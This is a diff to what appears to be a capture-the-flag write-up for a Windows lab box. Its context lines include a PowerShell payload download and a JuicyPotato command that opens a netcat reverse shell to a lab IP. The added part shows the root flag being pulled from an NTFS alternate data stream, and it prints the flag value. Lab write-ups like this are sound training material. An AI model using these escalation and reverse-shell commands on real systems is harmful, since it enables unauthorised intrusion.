@@ -97,3 +97,53 @@ powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.10.14.32
 JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c nc.exe -e cmd.exe 10.10.14.32 443" -t *
 ```
 
+**Got root flag alternating data streams:**
+On Administrator desktop folder:
+1. List directory with hidden files 
+```cmd
+:\Users\Administrator\Desktop>dir /r
+ Volume in drive C has no label.
+ Volume Serial Number is 71A1-6FA1
+
+ Directory of C:\Users\Administrator\Desktop
+
+11/08/2017  10:05 AM    <DIR>          .
+11/08/2017  10:05 AM    <DIR>          ..
+12/24/2017  03:51 AM                36 hm.txt
+                                    34 hm.txt:root.txt:$DATA
+11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
+               2 File(s)            833 bytes
+               2 Dir(s)   2,375,929,856 bytes free
+```
+2. Extract hidden file
+```cmd
+C:\Users\Administrator\Desktop>expand hm.txt:root.txt root.txt
+Microsoft (R) File Expansion Utility  Version 10.0.10011.16384
+Copyright (c) Microsoft Corporation. All rights reserved.
+
+Copying hm.txt:root.txt to root.txt.
+hm.txt:root.txt: 34 bytes copied.
+```
+
+3. Check files again:
+```cmd
+C:\Users\Administrator\Desktop>dir
+ Volume in drive C has no label.
+ Volume Serial Number is 71A1-6FA1
+
+ Directory of C:\Users\Administrator\Desktop
+
+04/13/2024  08:59 PM    <DIR>          .
+04/13/2024  08:59 PM    <DIR>          ..
+12/24/2017  03:51 AM                36 hm.txt
+12/24/2017  03:51 AM                34 root.txt
+11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
+               3 File(s)            867 bytes
+               2 Dir(s)   2,375,929,856 bytes free
+```
+
+4. Get flag
+```cmd
+C:\Users\Administrator\Desktop>type root.txt
+afbc5bd4b615a60648cec41c6ac92530
+```
